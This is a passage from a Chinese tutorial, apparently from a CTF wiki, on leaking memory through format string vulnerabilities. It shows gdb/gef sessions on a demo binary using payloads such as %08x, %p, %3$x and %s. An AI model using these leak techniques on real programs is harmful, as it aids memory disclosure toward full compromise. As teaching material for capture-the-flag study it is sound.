\u6b64\u65f6\uff0c\u7a0b\u5e8f\u7b49\u5f85\u6211\u4eec\u7684\u8f93\u5165\uff0c\u8fd9\u65f6\u6211\u4eec\u8f93\u5165%08x.%08x.%08x\uff0c\u7136\u540e\u6572\u51fb\u56de\u8f66\uff0c\u662f\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u9996\u5148\u65ad\u5728\u4e86\u7b2c\u4e00\u6b21\u8c03\u7528printf\u51fd\u6570\u7684\u4f4d\u7f6e Breakpoint 1 , __printf ( format = 0x8048563 \"%08x.%08x.%08x.%s\\n\" ) at printf.c:28 28 printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccec' , 'l8' ] 8 0xffffccec\u2502+0x00: 0x080484bf \u2192 <main+84> add esp, 0x20 \u2190 $esp 0xffffccf0\u2502+0x04: 0x08048563 \u2192 \"%08x.%08x.%08x.%s\" 0xffffccf4\u2502+0x08: 0x00000001 0xffffccf8\u2502+0x0c: 0x22222222 0xffffccfc\u2502+0x10: 0xffffffff 0xffffcd00\u2502+0x14: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd04\u2502+0x18: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x1c: 0x000000c2 \u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u65f6\u6b64\u65f6\u5df2\u7ecf\u8fdb\u5165\u4e86printf\u51fd\u6570\u4e2d\uff0c\u6808\u4e2d\u7b2c\u4e00\u4e2a\u53d8\u91cf\u4e3a\u8fd4\u56de\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u7b2c\u4e09\u4e2a\u53d8\u91cf\u4e3aa\u7684\u503c\uff0c\u7b2c\u56db\u4e2a\u53d8\u91cf\u4e3ab\u7684\u503c\uff0c\u7b2c\u4e94\u4e2a\u53d8\u91cf\u4e3ac\u7684\u503c\uff0c\u7b2c\u516d\u4e2a\u53d8\u91cf\u4e3a\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002\u7ee7\u7eed\u8fd0\u884c\u7a0b\u5e8f gef\u27a4 c Continuing. 00000001 .22222222.ffffffff.%08x.%08x.%08x \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u8f93\u51fa\u4e86\u6bcf\u4e00\u4e2a\u53d8\u91cf\u5bf9\u5e94\u7684\u6570\u503c\uff0c\u5e76\u4e14\u65ad\u5728\u4e86\u4e0b\u4e00\u4e2aprintf\u5904 Breakpoint 1 , __printf ( format = 0xffffcd10 \"%08x.%08x.%08x\" ) at printf.c:28 28 in printf.c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\" \u6b64\u65f6\uff0c\u7531\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a%x%x%x\uff0c\u6240\u4ee5\uff0c\u7a0b\u5e8f \u4f1a\u5c06\u6808\u4e0a\u76840xffffcd04\u53ca\u5176\u4e4b\u540e\u7684\u6570\u503c\u5206\u522b\u4f5c\u4e3a\u7b2c\u4e00\uff0c\u7b2c\u4e8c\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u6309\u7167int\u578b\u8fdb\u884c\u89e3\u6790\uff0c\u5206\u522b\u8f93\u51fa\u3002\u7ee7\u7eed\u8fd0\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\u53bb\uff0c\u786e\u5b9e\u548c\u60f3\u8c61\u4e2d\u7684\u4e00\u6837\u3002 gef\u27a4 c Continuing. ffffcd10.000000c2.f7e8b6bb [ Inferior 1 ( process 57077 ) exited normally ] \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528%p\u6765\u83b7\u53d6\u6570\u636e\uff0c\u5982\u4e0b % p .% p .% p 00000001.22222222 . ffffffff .% p .% p .% p 0xfff328c0 . 0xc2 . 0xf75c46bb \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6bcf\u6b21\u5f97\u5230\u7684\u7ed3\u679c\u90fd\u4e00\u6837 \uff0c\u56e0\u4e3a\u6808\u4e0a\u7684\u6570\u636e\u4f1a\u56e0\u4e3a\u6bcf\u6b21\u5206\u914d\u7684\u5185\u5b58\u9875\u4e0d\u540c\u800c\u6709\u6240\u4e0d\u540c\uff0c\u8fd9\u662f\u56e0\u4e3a\u6808\u662f\u4e0d\u5bf9\u5185\u5b58\u9875\u505a\u521d\u59cb\u5316\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u4e0a\u9762\u7ed9\u51fa\u7684\u65b9\u6cd5\uff0c\u90fd\u662f\u4f9d\u6b21\u83b7\u5f97\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u6808\u4e2d\u88ab\u89c6\u4e3a\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u503c\u5462 \uff1f\u80af\u5b9a\u662f\u53ef\u4ee5\u7684\u5566\u3002\u65b9\u6cd5\u5982\u4e0b %n$x \u5229\u7528\u5982\u4e0b\u7684\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u6570\u503c\u3002\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u8981\u8bf4\u662f\u5bf9\u5e94\u7b2cn+1\u4e2a\u53c2\u6570\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u53c2\u6570\u91cc\u9762\u7684n\u6307\u7684\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u7b2cn\u4e2a\u8f93\u51fa\u53c2\u6570\uff0c\u90a3\u76f8\u5bf9\u4e8e\u8f93\u51fa\u51fd\u6570\u6765\u8bf4\uff0c\u5c31\u662f\u7b2cn+1\u4e2a\u53c2\u6570\u4e86\u3002 \u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u4ee5gdb\u8c03\u8bd5\u4e00\u4e0b\u3002 \u279c leakmemory git: ( master ) \u2717 gdb leakmemory gef\u27a4 b printf Breakpoint 1 at 0x8048330 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory %3 $x Breakpoint 1 , __printf ( format = 0x8048563 \"%08x.%08x.%08x.%s\\n\" ) at printf.c:28 28 printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccec' , 'l8' ] 8 0xffffccec\u2502+0x00: 0x080484bf \u2192 <main+84> add esp, 0x20 \u2190 $esp 0xffffccf0\u2502+0x04: 0x08048563 \u2192 \"%08x.%08x.%08x.%s\" 0xffffccf4\u2502+0x08: 0x00000001 0xffffccf8\u2502+0x0c: 0x22222222 0xffffccfc\u2502+0x10: 0xffffffff 0xffffcd00\u2502+0x14: 0xffffcd10 \u2192 \"%3 $x \" 0xffffcd04\u2502+0x18: 0xffffcd10 \u2192 \"%3 $x \" 0xffffcd08\u2502+0x1c: 0x000000c2 gef\u27a4 c Continuing. 00000001 .22222222.ffffffff.%3 $x Breakpoint 1 , __printf ( format = 0xffffcd10 \"%3 $x \" ) at printf.c:28 28 in printf.c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%3 $x \" 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%3 $x \" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%3 $x \" \u2190 $eax 0xffffcd14\u2502+0x18: 0xffffce00 \u2192 0x00000001 0xffffcd18\u2502+0x1c: 0x000000e0 gef\u27a4 c Continuing. f7e8b6bb [ Inferior 1 ( process 57442 ) exited normally ] \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u786e\u5b9e\u83b7\u5f97\u4e86printf\u7684\u7b2c4\u4e2a\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u503cf7e8b6bb\u3002 \u83b7\u53d6\u6808\u53d8\u91cf\u5bf9\u5e94\u5b57\u7b26\u4e32 \u00b6 \u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u5f97\u6808\u53d8\u91cf\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u9700\u8981\u7528\u5230%s\u4e86\u3002\u8fd9\u91cc\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u8fdb\u884cgdb\u8c03\u8bd5\uff0c\u5982\u4e0b \u279c leakmemory git: ( master ) \u2717 gdb leakmemory gef\u27a4 b printf Breakpoint 1 at 0x8048330 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory %s Breakpoint 1 , __printf ( format = 0x8048563 \"%08x.%08x.%08x.%s\\n\" ) at printf.c:28 28 printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccec' , 'l8' ] 8 0xffffccec\u2502+0x00: 0x080484bf \u2192 <main+84> add esp, 0x20 \u2190 $esp 0xffffccf0\u2502+0x04: 0x08048563 \u2192 \"%08x.%08x.%08x.%s\" 0xffffccf4\u2502+0x08: 0x00000001 0xffffccf8\u2502+0x0c: 0x22222222 0xffffccfc\u2502+0x10: 0xffffffff 0xffffcd00\u2502+0x14: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd04\u2502+0x18: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd08\u2502+0x1c: 0x000000c2 gef\u27a4 c Continuing. 00000001 .22222222.ffffffff.%s Breakpoint 1 , __printf ( format = 0xffffcd10 \"%s\" ) at printf.c:28 28 in printf.c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: 0xff007325 ( \"%s\" ? ) \u2190 $eax 0xffffcd14\u2502+0x18: 0xffffce3c \u2192 0xffffd074 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd18\u2502+0x1c: 0x000000e0 gef\u27a4 c Continuing. %s [ Inferior 1 ( process 57488 ) exited normally ] \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u7b2c\u4e8c\u6b21\u6267\u884cprintf\u51fd\u6570\u7684\u65f6\u5019\uff0c\u786e\u5b9e\u662f\u5c060xffffcd04\u5904\u7684\u53d8\u91cf\u89c6\u4e3a\u5b57\u7b26\u4e32\u53d8\u91cf\uff0c\u8f93\u51fa\u4e86\u5176\u6570\u503c\u6240\u5bf9\u5e94\u7684\u5730\u5740\u5904\u7684\u5b57\u7b26\u4e32\u3002 \u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u6837\u7684\u90fd\u4f1a\u6b63\u5e38\u8fd0\u884c\uff0c\u5982\u679c\u5bf9\u5e94\u7684\u53d8\u91cf\u4e0d\u80fd\u591f\u88ab\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\u5730\u5740\uff0c\u90a3\u4e48\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u5d29\u6e83\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6307\u5b9a\u83b7\u53d6\u6808\u4e0a\u7b2c\u51e0\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u6bd4\u5982\u6211\u4eec\u6307\u5b9a\u7b2cprintf\u7684\u7b2c3\u4e2a\u53c2\u6570\uff0c\u5982\u4e0b\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5c31\u4e0d\u80fd\u591f\u89e3\u6790\uff0c\u5c31\u5d29\u6e83\u4e86\u3002 \u279c leakmemory git: ( master ) \u2717 ./leakmemory %2 $s 00000001 .22222222.ffffffff.%2 $s [ 1 ] 57534 segmentation fault ( core dumped ) ./leakmemory \u5c0f\u6280\u5de7\u603b\u7ed3 \u5229\u7528%x\u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528%p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528%s\u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528%order$x\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528%order$s\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u00b6 \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u4e0a\u9762\u65e0\u8bba\u662f\u6cc4\u9732\u6808\u4e0a\u8fde\u7eed\u7684\u53d8\u91cf\uff0c\u8fd8\u662f\u8bf4\u6cc4\u9732\u6307\u5b9a\u7684\u53d8\u91cf\u503c\uff0c\u6211\u4eec\u90fd\u6ca1\u80fd\u5b8c\u5168\u63a7\u5236\u6211\u4eec\u6240\u8981\u6cc4\u9732\u7684\u53d8\u91cf\u7684\u5730\u5740\u3002\u8fd9\u6837\u7684\u6cc4\u9732\u56fa\u7136\u6709\u7528\uff0c\u53ef\u662f\u5374\u4e0d\u591f\u5f3a\u529b\u6709\u6548\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u60f3\u8981\u6cc4\u9732\u67d0\u4e00\u4e2alibc\u51fd\u6570\u7684got\u8868\u5185\u5bb9\uff0c\u4ece\u800c\u5f97\u5230\u5176\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\u4ee5\u53ca\u5176\u4ed6\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5019\uff0c\u80fd\u591f\u5b8c\u5168\u63a7\u5236\u6cc4\u9732\u67d0\u4e2a\u6307\u5b9a\u5730\u5740\u7684\u5185\u5b58\u5c31\u663e\u5f97\u5f88\u91cd\u8981\u4e86\u3002\u90a3\u4e48\u6211\u4eec\u7a76\u7adf\u80fd\u4e0d\u80fd\u8fd9\u6837\u505a\u5462\uff1f\u81ea\u7136\u4e5f\u662f\u53ef\u4ee5\u7684\u5566\u3002 \u6211\u4eec\u518d\u4ed4\u7ec6\u56de\u60f3\u4e00\u4e0b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\uff0c\u6211\u4eec\u6240\u8bfb\u53d6\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5728\u6808\u4e0a\u7684\uff08\u56e0\u4e3a\u662f\u67d0\u4e2a\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u672c\u4f8b\u4e2ds\u662fmain\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff09\u3002\u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u8c03\u7528\u8f93\u51fa\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\u5176\u5b9e\u5c31\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u6211\u4eec\u9009\u62e9\u4e0a\u9762\u7684\u67d0\u4e2a\u51fd\u6570\u8c03\u7528\u4e3a\u4f8b Breakpoint 1 , __printf ( format = 0xffffcd10 \"%s\" ) at printf.c:28 28 in printf.c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: 0xff007325 ( \"%s\" ? ) \u2190 $eax 0xffffcd14\u2502+0x18: 0xffffce3c \u2192 0xffffd074 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd18\u2502+0x1c: 0x000000e0 